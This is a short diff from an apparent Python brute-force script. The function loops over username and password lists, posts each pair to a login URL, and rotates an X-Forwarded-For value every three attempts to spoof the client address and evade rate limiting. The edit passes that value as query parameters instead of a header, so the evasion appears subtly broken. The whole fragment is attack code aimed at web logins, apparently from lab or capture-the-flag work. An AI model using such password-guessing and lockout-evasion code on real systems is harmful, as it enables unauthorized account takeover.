@@ -22,7 +22,7 @@ def payload(url, password_list, user_list, i):
         for passwod in password_list :
             pra = {'X-Forwarded-For' : str(i)}
             pload = {'username' : str(user) , 'password' : str(passwod)}
-            rep = requests.post(url , data=pload , )
+            rep = requests.post(url , data=pload , params=pra )
             c = c + 1
             if c % 3 == 0 :
                 i = i + 1 
